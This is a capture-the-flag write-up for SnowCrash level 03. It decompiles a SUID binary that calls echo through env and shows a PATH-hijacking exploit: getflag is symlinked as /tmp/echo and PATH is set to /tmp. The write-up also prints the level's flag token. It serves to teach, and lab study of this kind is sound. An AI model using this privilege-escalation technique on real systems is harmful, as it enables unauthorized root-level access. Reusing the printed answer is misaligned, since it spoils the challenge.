# 🔐 Level 03

> **Category:** Binary Exploitation  
> **Difficulty:** ⭐⭐☆☆☆  
> **Key Technique:** PATH hijacking, SUID binary exploitation

---

## 📋 Overview

A SUID binary uses `system()` with a relative path, allowing us to hijack the command execution by manipulating the PATH environment variable.

---

## 🔍 Reconnaissance

### Disassembling the Binary

```bash
level03@SnowCrash:~$ gdb -q ./level03
(gdb) disassemble main
```

### Decompiled Source (via Ghidra)

```c
int main(int argc, char **argv, char **envp) {
    __gid_t __rgid;
    __uid_t __ruid;
    int iVar1;

    __rgid = getegid();
    __ruid = geteuid();
    setresgid(__rgid, __rgid, __rgid);
    setresuid(__ruid, __ruid, __ruid);
    iVar1 = system("/usr/bin/env echo Exploit me");
    return iVar1;
}
```

---

## 💡 Vulnerability Analysis

The binary calls:
```c
system("/usr/bin/env echo Exploit me");
```

> [!WARNING]
> Using `/usr/bin/env echo` means the shell searches for `echo` in the **PATH** environment variable. By prepending a malicious directory to PATH, we can make it execute our own `echo` instead.

---

## 🎯 Exploitation

### Creating a Malicious "echo"

```bash
# Create a symlink to getflag named "echo"
level03@SnowCrash:~$ ln -s /bin/getflag /tmp/echo

# Hijack PATH to prioritize /tmp
level03@SnowCrash:~$ export PATH=/tmp

# Execute the SUID binary
level03@SnowCrash:~$ ./level03
Check flag.Here is your token : qi0maab88jeaj46qoumi7maus
```

---

## ✅ Flag

| Item | Value |
|------|-------|
| Token | `qi0maab88jeaj46qoumi7maus` |

---

## 📚 References

- [PATH Hijacking Attack](https://www.hackingarticles.in/linux-privilege-escalation-using-path-variable/)
- [SUID Binary Exploitation](https://gtfobins.github.io/)